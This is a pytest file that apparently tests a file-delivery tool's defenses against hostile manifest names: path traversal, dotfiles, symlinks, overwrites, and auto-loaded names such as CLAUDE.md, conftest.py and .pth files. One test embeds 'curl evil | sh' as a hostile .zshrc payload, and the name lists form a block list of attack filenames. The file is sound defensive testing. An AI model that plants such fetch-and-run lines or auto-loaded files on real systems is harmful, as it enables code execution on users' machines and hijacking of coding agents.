"""Review M2: `pworkers fetch` must never overwrite an existing file, and the name in the manifest
(chosen by the other party) must not be able to address a dotfile or another directory."""
from __future__ import annotations

import importlib

import pytest

from passiveworkers import artifacts as A


@pytest.fixture
def op_module(tmp_path, monkeypatch):
    monkeypatch.setenv("PW_LIBRARY_DIR", str(tmp_path / "lib"))
    import passiveworkers.operator as OP
    return importlib.reload(OP)


def _manifest_named(tmp_path, name, payload=b"delivered bytes"):
    src = tmp_path / "src.bin"
    src.write_bytes(payload)
    man, blobs = A.chunk_file(str(src))
    man["name"] = name
    return man, blobs


def test_reassemble_never_overwrites_an_existing_file(tmp_path):
    out = tmp_path / "out"
    out.mkdir()
    (out / "report.txt").write_bytes(b"MINE")
    man, blobs = _manifest_named(tmp_path, "report.txt")
    first = A.reassemble(man, blobs.get, str(out))
    second = A.reassemble(man, blobs.get, str(out))
    assert (out / "report.txt").read_bytes() == b"MINE"          # untouched
    assert first.name == "report (1).txt" and second.name == "report (2).txt"
    assert first.read_bytes() == second.read_bytes() == b"delivered bytes"
    assert sorted(p.name for p in out.iterdir()) == ["report (1).txt", "report (2).txt", "report.txt"]


@pytest.mark.parametrize("name", [".zshrc", ".gitconfig", ".env", ".", "..", "a/b", "a\\b", "../x",
                                  "/etc/passwd", "bad\x00name", "tab\tname", " padded", "x" * 300])
def test_reassemble_refuses_dotfiles_separators_and_odd_names(tmp_path, name):
    out = tmp_path / "out"
    out.mkdir()
    (out / ".zshrc").write_bytes(b"MY SHELL RC")
    man, blobs = _manifest_named(tmp_path, name)
    with pytest.raises(ValueError, match="unsafe deliverable name"):
        A.reassemble(man, blobs.get, str(out))
    assert sorted(p.name for p in out.iterdir()) == [".zshrc"]   # nothing new, no .part left behind
    assert (out / ".zshrc").read_bytes() == b"MY SHELL RC"


def test_reassemble_does_not_write_through_a_symlink(tmp_path):
    out = tmp_path / "out"
    out.mkdir()
    victim = tmp_path / "victim.txt"
    victim.write_bytes(b"VICTIM")
    (out / "report.txt").symlink_to(victim)
    man, blobs = _manifest_named(tmp_path, "report.txt")
    dest = A.reassemble(man, blobs.get, str(out))
    assert victim.read_bytes() == b"VICTIM"
    assert dest.name == "report (1).txt" and dest.read_bytes() == b"delivered bytes"


def _stub_requests(OP, monkeypatch, man, blobs):
    monkeypatch.setenv("PW_COORDINATOR", "http://c")
    monkeypatch.setenv("PW_USER_SECRET", "SEC")
    merged = A.wrap_artifact(man)

    def fake_get(url, **kw):
        if "/blob/" in url:
            return type("R", (), {"ok": True, "content": blobs[url.rsplit("/", 1)[1]]})()
        return type("R", (), {"ok": True, "json": staticmethod(lambda: {"merged": merged})})()
    monkeypatch.setattr(OP, "requests", type("R", (), {"get": staticmethod(fake_get)}))


def test_fetch_cli_refuses_a_dotfile_deliverable_cleanly(op_module, monkeypatch, capsys, tmp_path):
    """The composed `pworkers fetch <job> <dir>`: a hostile manifest named .zshrc exits 1 with a
    message (no traceback) and the asker's real .zshrc is untouched."""
    man, blobs = _manifest_named(tmp_path, ".zshrc", b"curl evil | sh")
    _stub_requests(op_module, monkeypatch, man, blobs)
    out = tmp_path / "home"
    out.mkdir()
    (out / ".zshrc").write_bytes(b"MY SHELL RC")
    assert op_module.fetch("job1", str(out)) == 1
    assert "refusing to write" in capsys.readouterr().out
    assert (out / ".zshrc").read_bytes() == b"MY SHELL RC"
    assert [p.name for p in out.iterdir()] == [".zshrc"]


def test_fetch_cli_keeps_existing_file_and_says_so(op_module, monkeypatch, capsys, tmp_path):
    man, blobs = _manifest_named(tmp_path, "data.csv", b"a,b\n")
    _stub_requests(op_module, monkeypatch, man, blobs)
    out = tmp_path / "proj"
    out.mkdir()
    (out / "data.csv").write_bytes(b"MY BUILD")
    assert op_module.fetch("job1", str(out)) == 0
    text = capsys.readouterr().out
    assert "data (1).csv" in text and "left untouched" in text
    assert (out / "data.csv").read_bytes() == b"MY BUILD"
    assert (out / "data (1).csv").read_bytes() == b"a,b\n"


# PW-5: names that are not dotfiles but that agents, shells, build tools and interpreters
# auto-load or execute from a directory. A delivered file must never be able to take one of them.
@pytest.mark.parametrize("name", [
    "CLAUDE.md", "claude.md", "AGENTS.md", "GEMINI.md", "CLAUDE.local.md", "SKILL.md",
    "conftest.py", "sitecustomize.py", "usercustomize.py", "setup.py", "__init__.py", "__main__.py",
    "Makefile", "GNUmakefile", "Justfile", "Dockerfile", "package.json", "pyproject.toml",
    "evil.pth", "EVIL.PTH", "tox.ini", "pytest.ini", "setup.cfg", "Rakefile", "Gemfile",
    "report.md.", "CLAUDE.md::$DATA", "a:b.txt", "QWEN.md", "go.mod", "vite.config.ts", "x.command",
    "NUL.txt", "com1", "tool.jar", "Taskfile.yml", "compose.yaml",
])
def test_reassemble_refuses_auto_loaded_names(tmp_path, name):
    out = tmp_path / "out"
    out.mkdir()
    man, blobs = _manifest_named(tmp_path, name)
    with pytest.raises(ValueError, match="unsafe deliverable name"):
        A.reassemble(man, blobs.get, str(out))
    assert list(out.iterdir()) == []


@pytest.mark.parametrize("name", ["report.md", "data.csv", "notes.txt", "photo.png", "my CLAUDE notes.md"])
def test_reassemble_still_accepts_ordinary_names(tmp_path, name):
    out = tmp_path / "out"
    out.mkdir()
    man, blobs = _manifest_named(tmp_path, name)
    assert A.reassemble(man, blobs.get, str(out)).name == name
